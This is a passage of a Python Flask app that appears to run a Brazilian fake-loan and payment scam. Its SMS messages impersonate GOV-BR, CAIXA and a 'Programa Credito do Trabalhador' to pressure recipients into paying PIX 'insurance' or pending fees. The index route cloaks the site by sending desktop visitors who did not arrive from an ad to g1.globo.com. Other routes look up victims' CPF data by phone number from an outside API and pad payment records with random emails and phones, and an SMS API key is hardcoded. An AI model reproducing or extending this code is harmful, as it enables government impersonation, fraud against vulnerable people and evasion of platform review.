            app.logger.info(f"[FACEBOOK] Evento Purchase enviado para /compra_sucesso com valor {purchase_amount} e UTM params presentes: {utm_params.keys() if utm_params else 'Nenhum'}")
            app.logger.info(f"[FACEBOOK] Resultado do envio: {purchase_events[0] if purchase_events else 'Nenhum resultado'}")
            
            # Salvar a compra no banco de dados para remarketing
            try:
                save_purchase_to_db(
                    transaction_id=order_number,
                    amount=float(purchase_amount),
                    product_name="Mounjaro (Tirzepatida) 5mg"
                )
                app.logger.info(f"[DB] Compra salva no banco de dados para remarketing: {order_number}")
            except Exception as db_error:
                app.logger.error(f"[DB] Erro ao salvar compra para remarketing: {str(db_error)}")
                
        except Exception as fb_error:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento Purchase: {str(fb_error)}")

        return render_template('compra_sucesso.html', 
                              order_number=order_number, 
                              order_date=order_date,
                              utm_params=utm_params,
                              utm_source=utm_source,
                              utm_medium=utm_medium,
                              utm_campaign=utm_campaign,
                              utm_content=utm_content,
                              utm_term=utm_term,
                              customer_name=customer_name)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página de confirmação de compra: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using SMSDEV API
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Usar a chave de API diretamente que foi testada e funcionou
        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
            # Message template
            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."

            # Verificamos se há uma URL no texto para encurtar
            url_to_shorten = None
            if "http://" in message or "https://" in message:
                # Extrai a URL da mensagem
                url_pattern = r'(https?://[^\s]+)'
                url_match = re.search(url_pattern, message)
                if url_match:
                    url_to_shorten = url_match.group(0)
                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")

            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message,
                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
            }

            # Make API request
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)

            # Log the response
            app.logger.info(f"SMSDEV: Verification code sent to {formatted_phone}. Response: {response.text}")

            if response.status_code == 200:
                return True, None
            else:
                return False, f"API error: {response.text}"
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido"

    except Exception as e:
        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
        return False, str(e)

def send_verification_code_owen(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using Owen SMS API v2
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Get SMS API token from environment variables
        sms_token = os.environ.get('SMS_OWEN_TOKEN')
        if not sms_token:
            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
            return False, "API token not configured"

        # Format phone number (remove any non-digits and add Brazil country code)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
            # Format as international number with Brazil code
            international_number = f"55{formatted_phone}"

            # Message template
            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."

            # Prepare the curl command
            import subprocess

            curl_command = [
                'curl',
                '--location',
                'https://api.apisms.me/v2/sms/send',
                '--header', 'Content-Type: application/json',
                '--header', f'Authorization: {sms_token}',
                '--data',
                json.dumps({
                    "operator": "claro",  # claro, vivo ou tim
                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
                    "message": message,  # Mensagem SMS com limite de 160 caracteres
                    "tag": "VerificationCode",  # Tag para identificação do SMS
                    "user_reply": False,  # Não receber resposta do destinatário
                    "webhook_url": ""  # Opcional para callbacks
                })
            ]

            # Execute curl command
            app.logger.info(f"Enviando código de verificação para {international_number} usando curl")
            payload = {
                    'operator': 'claro',
                    'destination_number': international_number,
                    'message': message,
                    'tag': 'VerificationCode',
                    'user_reply': False,
                    'webhook_url': ''
                }
            app.logger.info(f"JSON payload: {json.dumps(payload)}")
                
            process = subprocess.run(curl_command, capture_output=True, text=True)

            # Log response
            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")

            if process.returncode == 0 and "error" not in process.stdout.lower():
                return True, None
            else:
                error_msg = process.stderr if process.stderr else process.stdout
                return False, f"API error: {error_msg}"
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido"

    except Exception as e:
        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
        return False, str(e)

def send_verification_code(phone_number: str) -> tuple:
    """
    Sends a verification code via the selected SMS API
    Returns a tuple of (success, code or error_message)
    """
    try:
        # Generate random 4-digit code
        verification_code = ''.join(random.choices('0123456789', k=4))

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) != 11:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido (deve conter DDD + 9 dígitos)"

        # Usar exclusivamente a API SMSDEV conforme solicitado
        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar código de verificação")
        success, error = send_verification_code_smsdev(phone_number, verification_code)

        if success:
            return True, verification_code
        else:
            return False, error

    except Exception as e:
        app.logger.error(f"Error in send_verification_code: {str(e)}")
        return False, str(e)

def send_sms_smsdev(phone_number: str, message: str) -> bool:
    """
    Send SMS using SMSDEV API
    """
    try:
        # Usar a chave de API diretamente que foi testada e funcionou
        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"
        
        # Format phone number (remove any non-digits and ensure it's in the correct format)
        formatted_phone = re.sub(r'\D', '', phone_number)
        if len(formatted_phone) == 11:  # Include DDD
            # Verificamos se há uma URL no texto para encurtar
            url_to_shorten = None
            if "http://" in message or "https://" in message:
                # Extrai a URL da mensagem
                url_pattern = r'(https?://[^\s]+)'
                url_match = re.search(url_pattern, message)
                if url_match:
                    url_to_shorten = url_match.group(0)
                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")
            
            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message,
                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
            }

            # Log detail antes do envio para depuração
            app.logger.info(f"[PROD] Enviando SMS via SMSDEV para {formatted_phone} com encurtamento de URL ativado. Payload: {params}")

            # Make API request with timeout
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params, timeout=10)
            
            # Analisar a resposta JSON se disponível
            try:
                response_data = response.json()
                app.logger.info(f"[PROD] SMSDEV: SMS enviado para {formatted_phone}. Resposta: {response_data}")
                
                # Verificar se a mensagem foi colocada na fila
                if response_data.get('situacao') == 'OK':
                    app.logger.info(f"[PROD] SMS enviado com sucesso para {formatted_phone}, ID: {response_data.get('id')}")
                    return True
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS: {response_data}")
                    return False
            except Exception as json_err:
                app.logger.error(f"[PROD] Erro ao analisar resposta JSON: {str(json_err)}")
                # Se não conseguir parsear JSON, verificar apenas o status code
                return response.status_code == 200
        else:
            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number} (formatado: {formatted_phone})")
            return False
    except Exception as e:
        app.logger.error(f"[PROD] Erro no envio de SMS via SMSDEV: {str(e)}")
        return False

def send_sms_owen(phone_number: str, message: str) -> bool:
    """
    Send SMS using Owen SMS API v2 with curl
    """
    try:
        # Get SMS API token from environment variables
        sms_token = os.environ.get('SMS_OWEN_TOKEN')
        if not sms_token:
            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
            return False

        # Format phone number (remove any non-digits and add Brazil country code)
        formatted_phone = re.sub(r'\D', '', phone_number)
        if len(formatted_phone) == 11:  # Include DDD
            # Format as international number with Brazil code
            international_number = f"55{formatted_phone}"

            # Prepare and execute curl command
            import subprocess

            curl_command = [
                'curl',
                '--location',
                'https://api.apisms.me/v2/sms/send',
                '--header', 'Content-Type: application/json',
                '--header', f'Authorization: {sms_token}',
                '--data',
                json.dumps({
                    "operator": "claro",  # claro, vivo ou tim
                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
                    "message": message,  # Mensagem SMS com limite de 160 caracteres
                    "tag": "LoanApproval",  # Tag para identificação do SMS
                    "user_reply": False,  # Não receber resposta do destinatário
                    "webhook_url": ""  # Opcional para callbacks
                })
            ]

            # Execute curl command
            app.logger.info(f"Enviando SMS para {international_number} usando curl")
            payload = {
                "operator": "claro",
                "destination_number": international_number,
                "message": message,
                "tag": "LoanApproval",
                "user_reply": False,
                "webhook_url": ""
            }
            app.logger.info(f"JSON payload: {json.dumps(payload)}")
            
            process = subprocess.run(curl_command, capture_output=True, text=True)

            # Log response
            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")

            return process.returncode == 0 and "error" not in process.stdout.lower()
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False
    except Exception as e:
        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
        return False

def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
    try:
        # Get first name
        first_name = full_name.split()[0]

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) != 11:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False

        # Message template
        message = f"[GOV-BR] {first_name}, estamos aguardando o pagamento do seguro no valor R${amount:.2f} para realizar a transferencia PIX do emprestimo para a sua conta bancaria."

        # Usar exclusivamente a API SMSDEV conforme solicitado
        app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS")
        return send_sms_smsdev(phone_number, message)
    except Exception as e:
        app.logger.error(f"Error in send_sms: {str(e)}")
        return False
        
def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
    """
    Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
    """
    try:
        if not phone_number:
            app.logger.error("[PROD] Número de telefone não fornecido para SMS de confirmação")
            return False
            
        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        if len(formatted_phone) != 11:
            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number}")
            return False
            
        # Formata CPF para exibição (XXX.XXX.XXX-XX)
        cpf_formatado = format_cpf(cpf) if cpf else ""
        
        # Criar mensagem personalizada com link para thank_you_url
        nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
        
        # Garantir que a URL está codificada corretamente
        # Se a URL ainda não estiver codificada, o API SMSDEV pode não encurtá-la completamente
        import urllib.parse
        # Verificar se a URL já foi codificada verificando se tem caracteres de escape como %20
        if '%' not in thank_you_url and (' ' in thank_you_url or '&' in thank_you_url):
            # Extrair a base da URL e os parâmetros
            if '?' in thank_you_url:
                base_url, query_part = thank_you_url.split('?', 1)
                params = {}
                for param in query_part.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params[key] = value
                
                # Recriar a URL com parâmetros codificados
                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
                thank_you_url = f"{base_url}?{query_string}"
                app.logger.info(f"[PROD] URL recodificada para SMS: {thank_you_url}")
        
        # Mensagem mais informativa para o cliente
        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
        
        # Log detalhado para debugging
        app.logger.info(f"[PROD] Enviando SMS para {phone_number} com mensagem: '{message}'")
        
        # Fazer várias tentativas de envio para maior garantia
        max_attempts = 3
        attempt = 0
        success = False
        
        while attempt < max_attempts and not success:
            attempt += 1
            try:
                # Usar exclusivamente a API SMSDEV para confirmação de pagamento
                app.logger.info(f"[PROD] Usando exclusivamente a API SMSDEV para enviar SMS de confirmação")
                success = send_sms_smsdev(phone_number, message)
                
                if success:
                    app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} via SMSDEV")
                    break
                else:
                    app.logger.warning(f"[PROD] Falha ao enviar SMS na tentativa {attempt}/{max_attempts} via SMSDEV")
                    time.sleep(1.0)  # Aumentando o intervalo entre tentativas
            except Exception as e:
                app.logger.error(f"[PROD] Erro na tentativa {attempt} com SMSDEV: {str(e)}")
        
        return success

    except Exception as e:
        app.logger.error(f"[PROD] Erro no envio de SMS de confirmação: {str(e)}")
        return False

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"{ddd}{number}"

def generate_qr_code(pix_code: str) -> str:
    # Importar o QRCode dentro da função para garantir que a biblioteca está disponível
    import qrcode
    from qrcode import constants
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(pix_code)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    return f"data:image/png;base64,{img_str}"

@app.route('/')
@app.route('/index')
def index():
    try:
        # Detectar ambiente de produção (Heroku)
        is_heroku = os.environ.get('DYNO') is not None
        
        # Log para depuração em produção
        if is_heroku:
            app.logger.info(f"[PROD] Verificação de acesso em ambiente Heroku")
            app.logger.info(f"[PROD] Referer: {request.headers.get('Referer', 'Nenhum')}")
            app.logger.info(f"[PROD] User-Agent: {request.headers.get('User-Agent', 'Nenhum')}")
            app.logger.info(f"[PROD] Tem g.is_mobile: {hasattr(g, 'is_mobile')}")
            app.logger.info(f"[PROD] Tem g.is_from_social_ad: {hasattr(g, 'is_from_social_ad')}")

        # Verificar se o request_analyzer está ativo e se o usuário é mobile ou veio de anúncio
        # Esta é uma verificação adicional além do middleware
        if hasattr(g, 'is_mobile') and hasattr(g, 'is_from_social_ad'):
            is_mobile = g.is_mobile
            is_from_social_ad = g.is_from_social_ad
            
            # Verificar se estamos em produção (não desenvolvimento)
            developing = os.environ.get('DEVELOPING', 'false').lower() == 'true'
            
            # Log sobre o estado de detecção
            app.logger.info(f"[PROD] Detecção: mobile={is_mobile}, ad={is_from_social_ad}, dev={developing}")
            
            # Se não for mobile e não vier de anúncio social, e estivermos em produção,
            # redirecionar para g1.globo.com
            if not developing and not is_mobile and not is_from_social_ad:
                # Verificar se é uma requisição do Replit
                referer = request.headers.get('Referer', '')
                is_replit_request = ('replit' in referer.lower() or 
                                    '.repl.' in referer.lower() or 
                                    '__replco' in referer.lower() or
                                    'worf.replit.dev' in referer.lower())
                
                # Não redirecionar se for do Replit
                if not is_replit_request:
                    app.logger.info(f"[PROD] Redirecionando desktop não-anúncio para g1 (verificação secundária)")
                    return redirect('https://g1.globo.com')
                else:
                    app.logger.debug(f"[DEV] Requisição do Replit detectada, ignorando redirecionamento")
        else:
            # Se g.is_mobile e g.is_from_social_ad não estiverem definidos, o middleware pode não estar ativo
            app.logger.warning(f"[PROD] O middleware request_analyzer parece não estar ativo!")
            
            # Verificação de fallback para garantir redirecionamento em produção quando o middleware falha
            if is_heroku:
                # Verificar se é mobile pelo User-Agent - Lista extendida de padrões mobile
                user_agent = request.headers.get('User-Agent', '').lower()
                mobile_patterns = [
                    'android', 'iphone', 'ipad', 'ipod', 'ios', 'windows phone',
                    'mobile', 'tablet', 'blackberry', 'opera mini', 'opera mobi',
                    'iemobile', 'silk', 'mobile safari', 'samsung', 'lg browser',
                    'sm-', 'gt-', 'mi ', 'redmi', 'htc', 'nokia', 'mobi', 'wv'
                ]
                # Se não temos user agent, consideramos como mobile por segurança
                if not user_agent:
                    is_mobile_manual = True
                    app.logger.info(f"[PROD] User-Agent ausente, considerando como mobile por segurança")
                else:
                    is_mobile_manual = any(device in user_agent for device in mobile_patterns)
                
                # Verificar se é de anúncio pelo Referer ou parâmetros UTM
                referer = request.headers.get('Referer', '').lower()
                social_params = ['utm_source', 'utm_medium', 'utm_campaign', 'fbclid', 'igshid', 'gclid']
                has_social_params = any(param in request.args for param in social_params)
                social_domains = ['facebook', 'instagram', 'fb.com', 'fb.watch', 'l.instagram']
                from_social_referer = any(domain in referer for domain in social_domains)
                
                # Log para depuração
                app.logger.info(f"[PROD] Verificação manual: mobile={is_mobile_manual}, social={has_social_params or from_social_referer}, user_agent={user_agent[:50]}")
                
                # Regra mais segura: só redireciona se for CERTAMENTE um desktop e CERTAMENTE não vier de anúncio
                if not is_mobile_manual and not (has_social_params or from_social_referer) and user_agent and ('windows' in user_agent or 'macintosh' in user_agent or 'linux' in user_agent):
                    app.logger.info(f"[PROD] Redirecionando desktop não-anúncio para g1 (fallback)")
                    return redirect('https://g1.globo.com')
                else:
                    app.logger.info(f"[PROD] Permitindo acesso: móvel={is_mobile_manual}, anúncio={has_social_params or from_social_referer}")
        
        # Get data from query parameters for backward compatibility
        customer_data = {
            'nome': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', '')
        }
        
        # Verificar se temos um número de telefone no UTM content
        utm_source = request.args.get('utm_source', '')
        utm_content = request.args.get('utm_content', '')
        phone_from_utm = None
        
        # Extrair número de telefone do utm_content
        if utm_content and len(utm_content) >= 10:
            # Limpar o número de telefone, mantendo apenas dígitos
            phone_from_utm = re.sub(r'\D', '', utm_content)
            app.logger.info(f"[PROD] Número de telefone extraído de utm_content: {phone_from_utm}")
            
            # Salvar o número do utm_content para uso posterior
            if phone_from_utm:
                customer_data['phone'] = phone_from_utm
                
                # Buscar dados do cliente na API externa
                try:
                    # Acessar a API real fornecida conforme especificado
                    api_url = f"https://webhook-manager.replit.app/api/v1/cliente?telefone={phone_from_utm}"
                    app.logger.info(f"[PROD] Consultando API de cliente: {api_url}")
                    
                    response = requests.get(api_url, timeout=5)
                    if response.status_code == 200:
                        api_response = response.json()
                        app.logger.info(f"[PROD] Dados do cliente obtidos da API: {api_response}")
                        
                        # Extrair os dados do cliente da resposta da API
                        if api_response.get('sucesso') and 'cliente' in api_response:
                            cliente_data = api_response['cliente']
                            client_data = {
                                'name': cliente_data.get('nome', 'Cliente Promocional'),
                                'cpf': cliente_data.get('cpf', ''),
                                'phone': cliente_data.get('telefone', phone_from_utm).replace('+55', ''),
                                'email': cliente_data.get('email', f"cliente_{phone_from_utm}@example.com")
                            }
                            
                            # Usar os dados obtidos da API para gerar uma transação com pagamentocomdesconto.py
                            api_desconto = create_payment_with_discount_api()
                            
                            # Preparar dados para a API
                            payment_data = {
                                'nome': client_data['name'],
                                'cpf': client_data['cpf'],
                                'telefone': client_data['phone'],
                                'email': client_data['email']
                            }
                            
                            # Criar o pagamento PIX com desconto
                            try:
                                pix_data = api_desconto.create_pix_payment_with_discount(payment_data)
                                app.logger.info(f"[PROD] PIX com desconto gerado com sucesso: {pix_data}")
                                
                                # Obter QR code e PIX code da resposta da API
                                qr_code = pix_data.get('pix_qr_code') or pix_data.get('pixQrCode')
                                pix_code = pix_data.get('pix_code') or pix_data.get('pixCode')
                                
                                # Garantir que temos valores válidos
                                if not qr_code:
                                    # Algumas APIs podem usar outros nomes para o QR code
                                    qr_code = pix_data.get('qr_code_image') or pix_data.get('qr_code') or ''
                                    
                                if not pix_code:
                                    # Algumas APIs podem usar outros nomes para o código PIX
                                    pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
                                
                                return render_template('payment_update.html', 
                                    qr_code=qr_code,
                                    pix_code=pix_code, 
                                    nome=client_data['name'], 
                                    cpf=format_cpf(client_data['cpf']),
                                    phone=client_data['phone'],
                                    transaction_id=pix_data.get('id'),
                                    amount=49.70)
                                
                            except Exception as pix_error:
                                app.logger.error(f"[PROD] Erro ao gerar PIX com desconto: {str(pix_error)}")
                                # Continua com o fluxo normal em caso de erro no pagamento
                        else:
                            # Tente o endpoint alternativo se o primeiro falhar
                            app.logger.warning(f"[PROD] API primária não retornou dados esperados, tentando endpoint alternativo")
                            api_url_alt = f"https://webhook-manager.replit.app/api/customer/{phone_from_utm}"
                            response_alt = requests.get(api_url_alt, timeout=5)
                            
                            if response_alt.status_code == 200:
                                api_data = response_alt.json()
                                app.logger.info(f"[PROD] Dados do cliente obtidos da API alternativa: {api_data}")
                                
                                client_data = {
                                    'name': api_data.get('name', 'Cliente Promocional'),
                                    'cpf': api_data.get('cpf', ''),
                                    'phone': phone_from_utm,
                                    'email': api_data.get('email', f"cliente_{phone_from_utm}@example.com")
                                }
                            else:
                                app.logger.warning(f"[PROD] Ambos endpoints de API falharam")
                                # Não gera erro, apenas continua com o fluxo normal
                    
                    # Atualizar dados do cliente que serão mostrados na página
                    if 'client_data' in locals():
                        customer_data['nome'] = client_data['name']
                        customer_data['cpf'] = client_data['cpf']
                        customer_data['phone'] = client_data['phone']
                        customer_data['email'] = client_data.get('email', '')
                        
                        # Marcar que este cliente tem desconto
                        customer_data['has_discount'] = True
                        customer_data['discount_price'] = 49.70
                        customer_data['regular_price'] = 73.40
                    
                except Exception as api_error:
                    app.logger.error(f"[PROD] Erro ao processar dados do cliente: {str(api_error)}")
        
        app.logger.info(f"[PROD] Renderizando página inicial para: {customer_data}")
        return render_template('index.html', customer=customer_data, 
                              has_discount='client_data' in locals(),
                              discount_price=49.70,
                              regular_price=73.40)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na rota index: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/payment')
def payment():
    try:
        app.logger.info("[PROD] Iniciando geração de PIX...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone')  # Get phone from query params
        source = request.args.get('source', 'index')
        has_discount = request.args.get('has_discount', 'false').lower() == 'true'

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}, has_discount={has_discount}")

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Use provided phone if available, otherwise generate random
        customer_phone = ''.join(filter(str.isdigit, phone)) if phone else generate_random_phone()

        # Define o valor baseado na origem e se tem desconto
        if has_discount:
            # Preço com desconto para clientes que vieram do SMS
            amount = 49.70
            app.logger.info(f"[PROD] Cliente com DESCONTO PROMOCIONAL, valor: {amount}")
            
            # Usa a API configurada pelo GATEWAY_CHOICE
            api = get_payment_gateway()
            
            # Dados para a transação
            payment_data = {
                'name': nome,
                'email': customer_email,
                'cpf': cpf_formatted,
                'phone': customer_phone,
                'amount': amount
            }
            
            # Cria o pagamento PIX com o gateway configurado
            pix_data = api.create_pix_payment(payment_data)
            
        else:
            # Preço normal, sem desconto
            if source == 'insurance':
                amount = 47.60  # Valor fixo para o seguro
            elif source == 'index':
                amount = 142.83
            else:
                amount = 73.40
                
            # Inicializa a API de pagamento normal
            api = get_payment_gateway()
                
            # Dados para a transação
            payment_data = {
                'name': nome,
                'email': customer_email,
                'cpf': cpf_formatted,
                'phone': customer_phone,
                'amount': amount
            }
            
            # Cria o pagamento PIX
            pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] Dados do pagamento: {payment_data}")
        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Send SMS notification if we have a valid phone number
        if phone:
            send_sms(phone, nome, amount)

        # Obter QR code e PIX code da resposta da API (adaptado para a estrutura da API NovaEra)
        # O QR code na NovaEra vem como URL para geração externa
        qr_code = pix_data.get('pix_qr_code')  # URL já formada para API externa
        pix_code = pix_data.get('pix_code')    # Código PIX para copiar e colar
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] Dados PIX recebidos da API: {pix_data}")
        
        # Garantir que temos valores válidos para exibição
        if not qr_code and pix_code:
            # Gerar QR code com biblioteca qrcode se tivermos o código PIX mas não o QR
            import qrcode
            from qrcode import constants
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(pix_code)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            buffered = BytesIO()
            img.save(buffered, format="PNG")
            qr_code = "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode()
            app.logger.info("[PROD] QR code gerado localmente a partir do código PIX")
            
        # Verificar possíveis nomes alternativos para o código PIX caso esteja faltando
        if not pix_code:
            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
            app.logger.info("[PROD] Código PIX obtido de campo alternativo")
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
            
        return render_template('payment.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         phone=phone,  # Adicionando o telefone para o template
                         transaction_id=pix_data.get('id'),
                         amount=amount)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/payment-update')
def payment_update():
    try:
        app.logger.info("[PROD] Iniciando geração de PIX para atualização cadastral...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone', '') # Adicionar parâmetro phone

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente para atualização: nome={nome}, cpf={cpf}, phone={phone}")

        # Inicializa a API usando nossa factory
        api = get_payment_gateway()

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Usa o telefone informado pelo usuário ou gera um se não estiver disponível
        if not phone:
            phone = generate_random_phone()
            app.logger.info(f"[PROD] Telefone não fornecido, gerando aleatório: {phone}")
        else:
            # Remover caracteres não numéricos do telefone
            phone = ''.join(filter(str.isdigit, phone))
            app.logger.info(f"[PROD] Usando telefone fornecido pelo usuário: {phone}")

        # Dados para a transação
        payment_data = {
            'name': nome,
            'email': customer_email,
            'cpf': cpf_formatted,
            'phone': phone,
            'amount': 73.40  # Valor fixo para atualização cadastral
        }

        app.logger.info(f"[PROD] Dados do pagamento de atualização: {payment_data}")

        # Cria o pagamento PIX
        pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Obter QR code e PIX code da resposta da API
        qr_code = pix_data.get('pix_qr_code')
        pix_code = pix_data.get('pix_code')
        
        # Garantir que temos valores válidos
        if not qr_code:
            # Algumas APIs podem usar outros nomes para o QR code
            qr_code = pix_data.get('qr_code_image') or pix_data.get('qr_code') or pix_data.get('pixQrCode') or ''
            
        if not pix_code:
            # Algumas APIs podem usar outros nomes para o código PIX
            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or pix_data.get('pixCode') or ''
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
            
        return render_template('payment_update.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         phone=phone,  # Passando o telefone para o template
                         transaction_id=pix_data.get('id'),
                         amount=73.40)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/check-payment-status/<transaction_id>')
def check_payment_status(transaction_id):
    try:
        # Obter informações do usuário da sessão se disponíveis
        nome = request.args.get('nome', '')
        cpf = request.args.get('cpf', '')
        phone = request.args.get('phone', '')
        
        # Logs detalhados de entrada para depuração
        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id} para cliente: nome={nome}, cpf={cpf}, phone={phone}")
        
        # Validar dados do cliente
        if not nome or not cpf:
            app.logger.warning(f"[PROD] Dados incompletos do cliente ao verificar pagamento. nome={nome}, cpf={cpf}")
        
        if not phone:
            app.logger.warning(f"[PROD] Telefone não fornecido para envio de SMS de confirmação: {transaction_id}")
        else:
            formatted_phone = re.sub(r'\D', '', phone)
            if len(formatted_phone) != 11:
                app.logger.warning(f"[PROD] Formato de telefone inválido: {phone} (formatado: {formatted_phone})")
            else:
